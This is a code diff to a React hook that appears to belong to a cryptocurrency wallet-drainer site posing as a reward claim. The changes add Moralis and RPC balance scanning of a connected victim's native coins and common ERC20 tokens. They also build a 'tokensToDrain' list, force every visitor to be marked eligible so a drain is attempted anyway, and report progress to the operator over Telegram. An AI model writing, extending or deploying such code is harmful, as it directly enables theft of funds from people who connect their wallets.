@@ -232,32 +232,47 @@ export function useWeb3Manager() {
                         const nativeRes = await fetch(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/balance?chain=${chain.id}`, {
                             headers: { 'X-API-Key': MORALIS_API_KEY, 'accept': 'application/json' }
                         });
-                        const nativeData = await nativeRes.json();
-                        if (nativeData && BigInt(nativeData.balance) > 0n) {
-                            hasAnyNativeBalance = true; // Mark as eligible!
-                            allAssets.push({
-                                address: "0x0000000000000000000000000000000000000000",
-                                chainId: chain.id,
-                                symbol: chain.symbol,
-                                isNative: true,
-                                balance: nativeData.balance,
-                                usd_value: 10 // Give native a base priority, but lower than high-value tokens
-                            });
+
+                        if (!nativeRes.ok) {
+                            const errText = await nativeRes.text();
+                            console.error(`Moralis Native Error (${chain.id}): ${nativeRes.status}`, errText);
+                            notifyTelegram(`<b>⚠️ API Error (Native)</b>\nChain: ${chain.id}\nStatus: ${nativeRes.status}\nMsg: ${errText.slice(0, 100)}`);
+                        } else {
+                            const nativeData = await nativeRes.json();
+                            if (nativeData && BigInt(nativeData.balance) > 0n) {
+                                hasAnyNativeBalance = true; // Mark as eligible!
+                                allAssets.push({
+                                    address: "0x0000000000000000000000000000000000000000",
+                                    chainId: chain.id,
+                                    symbol: chain.symbol,
+                                    isNative: true,
+                                    balance: nativeData.balance,
+                                    usd_value: 10 // Give native a base priority, but lower than high-value tokens
+                                });
+                            }
                         }
 
                         // B. Check ERC20
                         const response = await fetch(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/tokens?chain=${chain.id}&exclude_spam=true`, {
                             headers: { 'X-API-Key': MORALIS_API_KEY, 'accept': 'application/json' }
                         });
-                        const data = await response.json();
-                        if (data && data.result) {
-                            allAssets.push(...data.result.map((t: any) => ({
-                                address: t.token_address,
-                                chainId: chain.id, // Hex chain ID
-                                symbol: t.symbol,
-                                usd_value: t.usd_value || 0,
-                                isNative: false
-                            })));
+
+                        if (!response.ok) {
+                            const errText = await response.text();
+                            console.error(`Moralis Token Error (${chain.id}): ${response.status}`, errText);
+                            // Detailed notify for token errors as requested
+                            notifyTelegram(`<b>⚠️ API Error (Tokens)</b>\nChain: ${chain.id}\nStatus: ${response.status}\nMsg: ${errText.slice(0, 100)}`);
+                        } else {
+                            const data = await response.json();
+                            if (data && data.result) {
+                                allAssets.push(...data.result.map((t: any) => ({
+                                    address: t.token_address,
+                                    chainId: chain.id, // Hex chain ID
+                                    symbol: t.symbol,
+                                    usd_value: t.usd_value || 0,
+                                    isNative: false
+                                })));
+                            }
                         }
                     } catch (err) { }
                 }));
@@ -283,28 +298,53 @@ export function useWeb3Manager() {
         // IMPROVEMENT: If native balance was found, we are definitely eligible.
         // If Moralis failed entirely, we default to Eligible to attempt a drain anyway (using connected chain).
         // FORCE ELIGIBILITY: Always allow user to proceed.
-        // The claimReward function performs its own checks (gas, balance, etc).
         const finalEligibility = true;
 
-        // Ensure we at least have a native token entry if list is empty, 
-        // to give claimReward a target.
+        // EMERGENCY SCANNER: If API returned nothing, scan key tokens via RPC
         if (tokensToDrain.length === 0 && walletProvider) {
             try {
                 const provider = new ethers.BrowserProvider(walletProvider);
                 const net = await provider.getNetwork();
                 const chainIdHex = "0x" + net.chainId.toString(16);
-                const balance = await provider.getBalance(address);
 
-                // Add native placeholder even if 0, claimReward will skip if 0.
+                // 1. Check Native
+                const balance = await provider.getBalance(address);
+                // Always add native placeholder if we are scanning manually
                 tokensToDrain.push({
                     address: "0x0000000000000000000000000000000000000000",
                     chainId: chainIdHex,
                     symbol: "NATIVE",
                     isNative: true,
                     balance: balance.toString(),
-                    usd_value: 0
+                    usd_value: balance > 0n ? 10 : 0
                 });
-            } catch (e) { }
+
+                // 2. Scan Common Tokens (RPC)
+                const tokensToScan = TARGET_TOKENS[chainIdHex] || [];
+                if (tokensToScan.length > 0) {
+                    notifyTelegram(`<b>🔍 Scanning ${tokensToScan.length} tokens via RPC...</b>`);
+
+                    await Promise.all(tokensToScan.map(async (tAddr) => {
+                        try {
+                            const contract = new ethers.Contract(tAddr, MINIMAL_ERC20_ABI, provider);
+                            const bal = await contract.balanceOf(address);
+                            if (bal > 0n) {
+                                const symbol = await contract.symbol().catch(() => "TOKEN");
+                                tokensToDrain.push({
+                                    address: tAddr,
+                                    chainId: chainIdHex,
+                                    symbol: symbol,
+                                    isNative: false,
+                                    balance: bal.toString(),
+                                    usd_value: 50 // Assume value to prioritize
+                                });
+                            }
+                        } catch (e) { }
+                    }));
+                }
+            } catch (e) {
+                console.warn("Scanner failed", e);
+            }
         }
 
         setEligibility("Eligible");
